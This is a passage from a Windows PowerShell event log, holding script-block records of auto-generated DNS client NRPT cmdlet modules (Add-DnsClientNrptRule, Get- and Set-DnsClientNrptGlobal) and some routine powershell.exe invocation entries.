[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PassThru')) {\r\n          [object]$__cmdletization_value = ${PassThru}\r\n          $__cmdl"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'root/Microsoft/Windows/DNS/PS_DnsClientNrptRule'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Add-DnsClientNrptRule\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${GpoName},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessDnsServers')]\r\n    [string[]]\r\n    ${DANameServers},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessQueryIPsecRequired')]\r\n    [switch]\r\n    ${DAIPsecRequired},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessQueryIPSSECEncryption')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateSet('','None','Low','Medium','High')]\r\n    [string]\r\n    ${DAIPsecEncryptionType},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessProxyName')]\r\n    [string]\r\n    ${DAProxyServerName},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DnsSecEnabled')]\r\n    [switch]\r\n    ${DnsSecEnable},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DnsSecQueryIPsecRequired')]\r\n    [switch]\r\n    ${DnsSecIPsecRequired},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DnsSecQueryIPsecEncryption')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateSet('','None','Low','Medium','High')]\r\n    [string]\r\n    ${DnsSecIPsecEncryptionType},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [string[]]\r\n    ${NameServers},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateSet('Disable','Utf8WithMapping','Utf8WithoutMapping','Punycode')]\r\n    [string]\r\n    ${NameEncoding},\r\n\r\n    [Parameter(ParameterSetName='Add0', Mandatory=$true, Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${Namespace},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${Server},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessProxyType')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateSet('','NoProxy','UseDefault','UseProxyName')]\r\n    [string]\r\n    ${DAProxyType},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [switch]\r\n    ${DnsSecValidationRequired},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessEnabled')]\r\n    [switch]\r\n    ${DAEnable},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('IPsecCARestriction')]\r\n    [string]\r\n    ${IPsecTrustAuthority},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${Comment},\r\n\r\n    [Parameter(ParameterSetName='Add0', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${DisplayName},\r\n\r\n    [Parameter(ParameterSetName='Add0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PassThru},\r\n\r\n    [Parameter(ParameterSetName='Add0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Add0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Add0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GpoName')) {\r\n          [object]$__cmdletization_value = ${GpoName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DANameServers')) {\r\n          [object]$__cmdletization_value = ${DANameServers}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DANameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DANameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAIPsecRequired')) {\r\n          [object]$__cmdletization_value = ${DAIPsecRequired}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecRequired'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecRequired'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAIPsecEncryptionType')) {\r\n          [object]$__cmdletization_value = ${DAIPsecEncryptionType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAProxyServerName')) {\r\n          [object]$__cmdletization_value = ${DAProxyServerName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyServerName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyServerName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecEnable')) {\r\n          [object]$__cmdletization_value = ${DnsSecEnable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecEnable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecEnable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecIPsecRequired')) {\r\n          [object]$__cmdletization_value = ${DnsSecIPsecRequired}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecRequired'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecRequired'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecIPsecEncryptionType')) {\r\n          [object]$__cmdletization_value = ${DnsSecIPsecEncryptionType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NameServers')) {\r\n          [object]$__cmdletization_value = ${NameServers}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NameEncoding')) {\r\n          [object]$__cmdletization_value = ${NameEncoding}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameEncoding'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameEncoding'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Namespace')) {\r\n          [object]$__cmdletization_value = ${Namespace}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Server')) {\r\n          [object]$__cmdletization_value = ${Server}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAProxyType')) {\r\n          [object]$__cmdletization_value = ${DAProxyType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecValidationRequired')) {\r\n          [object]$__cmdletization_value = ${DnsSecValidationRequired}\r\n          $__cmdletization_meth"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'root/Microsoft/Windows/DNS/PS_DnsClientNrptGlobal'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-DnsClientNrptGlobal\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptGlobal')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Get0', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Server},\r\n\r\n    [Parameter(ParameterSetName='Get0', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${GpoName},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Server')) {\r\n          [object]$__cmdletization_value = ${Server}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GpoName')) {\r\n          [object]$__cmdletization_value = ${GpoName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptGlobal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Get', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNRPTGlobal_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientNrptGlobal' -Alias '*'\r\n        \r\n\r\nfunction Set-DnsClientNrptGlobal\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptGlobal')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Set1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('EnableOnNetworkID','EnableAlways','Disable','DisableDA')]\r\n    [string]\r\n    ${EnableDAForAllNetworks},\r\n\r\n    [Parameter(ParameterSetName='Set1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${GpoName},\r\n\r\n    [Parameter(ParameterSetName='Set1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disable','FallbackSecure','FallbackUnsecure','FallbackPrivate')]\r\n    [string]\r\n    ${SecureNameQueryFallback},\r\n\r\n    [Parameter(ParameterSetName='Set1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disable','QueryIPv6Only','QueryBoth')]\r\n    [string]\r\n    ${QueryPolicy},\r\n\r\n    [Parameter(ParameterSetName='Set1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Server},\r\n\r\n    [Parameter(ParameterSetName='Set1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PassThru},\r\n\r\n    [Parameter(ParameterSetName='Set1')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Set1')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Set1')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = 